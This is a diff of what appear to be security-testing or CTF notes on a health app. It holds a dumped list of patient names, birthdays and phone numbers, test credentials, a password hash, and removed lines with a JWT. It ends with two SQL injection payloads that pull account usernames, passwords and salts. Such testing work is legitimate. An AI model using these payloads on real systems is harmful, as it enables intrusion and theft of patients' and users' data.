@@ -7,16 +7,6 @@ Found patient list:
 [Patient[id=3, firstName=Charlie, lastName=Macall, birthday=2001-01-01, gender=Male, phone=3605550272], Patient[id=6, firstName=Zollie, lastName=Crighton, birthday=2004-07-30, gender=Male, phone=2065556991], Patient[id=7, firstName=Dorice, lastName=Beecheno, birthday=1944-10-28, gender=Female, phone=2065555143], Patient[id=85, firstName=Gamaliel, lastName=Annes, birthday=2010-08-28, gender=Male, phone=2065551661], Patient[id=86, firstName=Finley, lastName=Fearenside, birthday=1965-05-28, gender=Male, phone=2065553289], Patient[id=87, firstName=Desmund, lastName=Doornbos, birthday=1966-03-05, gender=Male, phone=2065559705], Patient[id=88, firstName=Calhoun, lastName=Armitt, birthday=1986-05-25, gender=Male, phone=2065557408], Patient[id=89, firstName=Meade, lastName=Bonniface, birthday=1959-02-22, gender=Female, phone=2065559205], Patient[id=90, firstName=Gardiner, lastName=Crisp, birthday=1985-06-29, gender=Male, phone=2065558359], Patient[id=91, firstName=Udell, lastName=Agastina, birthday=1957-11-05, gender=Male, phone=2065550075], Patient[id=92, firstName=Mile, lastName=Greaterex, birthday=1960-12-02, gender=Male, phone=2065551161], Patient[id=93, firstName=Regan, lastName=Setford, birthday=1956-09-23, gender=Female, phone=2065552370], Patient[id=94, firstName=Malory, lastName=Stammer, birthday=1978-09-26, gender=Female, phone=2065556294], Patient[id=95, firstName=Florance, lastName=Dyche, birthday=1989-05-17, gender=Female, phone=2065551556], Patient[id=96, firstName=Bentlee, lastName=Eversley, birthday=1959-07-18, gender=Male, phone=2065555479], Patient[id=97, firstName=Bel, lastName=Base, birthday=1972-08-21, gender=Female, phone=2065555996], Patient[id=98, firstName=Ettie, lastName=Raff, birthday=1981-02-21, gender=Female, phone=2065554821], Patient[id=99, firstName=Kippy, lastName=Caldecutt, birthday=1970-07-31, gender=Male, phone=2065558906], Patient[id=100, firstName=Katee, lastName=Faichnie, birthday=2003-12-29, gender=Female, phone=2065556606], Patient[id=101, firstName=Corine, lastName=Verey, birthday=1963-05-16, gender=Female, phone=2065559972], Patient[id=102, firstName=Ambrose, lastName=Calyton, birthday=2007-01-09, gender=Male, phone=2065559697], Patient[id=103, firstName=Rowney, lastName=Oran, birthday=1985-03-26, gender=Male, phone=2065559298], Patient[id=104, firstName=Tawsha, lastName=McAllen, birthday=1974-08-27, gender=Female, phone=2065556187], Patient[id=105, firstName=Park, lastName=Bramwich, birthday=1960-02-14, gender=Male, phone=2065557676], Patient[id=106, firstName=Sonja, lastName=Vollam, birthday=1974-05-11, gender=Female, phone=2065553474], Patient[id=107, firstName=Theressa, lastName=Pettyfer, birthday=1988-07-08, gender=Female, phone=2065552262]]
 ```
 
-## Main Patient
-
-### Creds
-
-[andrewv ::: andrewv]
-
-### JWT
-
-`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3NoYWRvd2hlYWx0aC5jb20vaXNzdWVyIiwidXBuIjoidXNlcjIiLCJncm91cHMiOlsiUGF0aWVudCJdLCJpYXQiOjE2OTgzMzkxOTYsImV4cCI6MTY5ODQyNTU5NiwianRpIjoiYjlhYWE5NmEtZGEwNC00ODQ0LTk0M2QtYzYyYzIwMjI3ZDRlIn0.NIrxfnxgzNQdArvlIBo7xEEZb8TAJFMx5TxiIY-WZlCd-K55TdWXe0sEyXEG4iacWDl8u1SueNOsTEJkarDvH2jm-nHdds9J9RbVhoyUGy3XwPEg4QiwiJdFTWrmtGRCi5LrzauQGe3nltWietSNbguusUwfugNWKaEpMx4OtVB70j9JdqSqbK6Rug9It8RwTM0YDJo_4M781-v9PB5bIZXKyzMd5gK2AUgjUrdNwVorFedcDBga7rVZDNvBw45BD6ami8KFd0KQ6eztCPxUW_RH9_JtZq5Kr5EV8PUpiZCC-nbIQNZdX5vhMe7NkkcipUjedg3cgkPjSQR29EMquQ`
-
 ## Gerard Sekawa
 
 Phone: 15305553475
@@ -68,59 +58,6 @@ $2a$10$9jtfW8ucfwreuuJbvRTp8..IPbU9/xYqw2CuYYfZwgDgQRMIa7TwW
 
 Patient 4 already has an associated account. 
 IRENE GREEN = PATIENT 4 > CREDS = [user2 ::: pass2]
-
-Unclaimed patients: 
-
-Patient[id=3, firstName=Charlie, lastName=Macall, birthday=2001-01-01, gender=Male, phone=3605550272]
-
-Patient[id=6, firstName=Zollie, lastName=Crighton, birthday=2004-07-30, gender=Male, phone=2065556991]
-
-Patient[id=7, firstName=Dorice, lastName=Beecheno, birthday=1944-10-28, gender=Female, phone=2065555143]
-Patient[id=85, firstName=Gamaliel, lastName=Annes, birthday=2010-08-28, gender=Male, phone=2065551661]
-
-Patient[id=86, firstName=Finley, lastName=Fearenside, birthday=1965-05-28, gender=Male, phone=2065553289]
-
-Patient[id=87, firstName=Desmund, lastName=Doornbos, birthday=1966-03-05, gender=Male, phone=2065559705]
-
-Patient[id=88, firstName=Calhoun, lastName=Armitt, birthday=1986-05-25, gender=Male, phone=2065557408]
-
-Patient[id=89, firstName=Meade, lastName=Bonniface, birthday=1959-02-22, gender=Female, phone=2065559205]
-
-Patient[id=90, firstName=Gardiner, lastName=Crisp, birthday=1985-06-29, gender=Male, phone=2065558359]
-
-Patient[id=91, firstName=Udell, lastName=Agastina, birthday=1957-11-05, gender=Male, phone=2065550075]
-
-Patient[id=92, firstName=Mile, lastName=Greaterex, birthday=1960-12-02, gender=Male, phone=2065551161]
-
-Patient[id=93, firstName=Regan, lastName=Setford, birthday=1956-09-23, gender=Female, phone=2065552370]
-
-Patient[id=94, firstName=Malory, lastName=Stammer, birthday=1978-09-26, gender=Female, phone=2065556294]
-
-Patient[id=95, firstName=Florance, lastName=Dyche, birthday=1989-05-17, gender=Female, phone=2065551556]
-
-Patient[id=96, firstName=Bentlee, lastName=Eversley, birthday=1959-07-18, gender=Male, phone=2065555479]
-
-Patient[id=97, firstName=Bel, lastName=Base, birthday=1972-08-21, gender=Female, phone=2065555996]
-
-Patient[id=98, firstName=Ettie, lastName=Raff, birthday=1981-02-21, gender=Female, phone=2065554821]
-
-Patient[id=99, firstName=Kippy, lastName=Caldecutt, birthday=1970-07-31, gender=Male, phone=2065558906]
-
-Patient[id=100, firstName=Katee, lastName=Faichnie, birthday=2003-12-29, gender=Female, phone=2065556606]
-
-Patient[id=101, firstName=Corine, lastName=Verey, birthday=1963-05-16, gender=Female, phone=2065559972]
-
-Patient[id=102, firstName=Ambrose, lastName=Calyton, birthday=2007-01-09, gender=Male, phone=2065559697]
-
-Patient[id=103, firstName=Rowney, lastName=Oran, birthday=1985-03-26, gender=Male, phone=2065559298]
-
-Patient[id=104, firstName=Tawsha, lastName=McAllen, birthday=1974-08-27, gender=Female, phone=2065556187]
-
-Patient[id=105, firstName=Park, lastName=Bramwich, birthday=1960-02-14, gender=Male, phone=2065557676]
-
-Patient[id=106, firstName=Sonja, lastName=Vollam, birthday=1974-05-11, gender=Female, phone=2065553474]
-
-Patient[id=107, firstName=Theressa, lastName=Pettyfer, birthday=1988-07-08, gender=Female, phone=2065552262]
 
 ## Delete Audit
 
@@ -205,8 +142,3 @@ Interesting Tables:
 1. ') AND 1=2 UNIOn Select 1,2,sql,4,5,6,7,8 FROM sqlite_master WHERE name='Account' --
 2. ') AND 1=2 UNIOn Select 1,2,role || ":" || username,4,password,salt,7,8 FROM Account --
 ```
-
-
-
-
-EOF
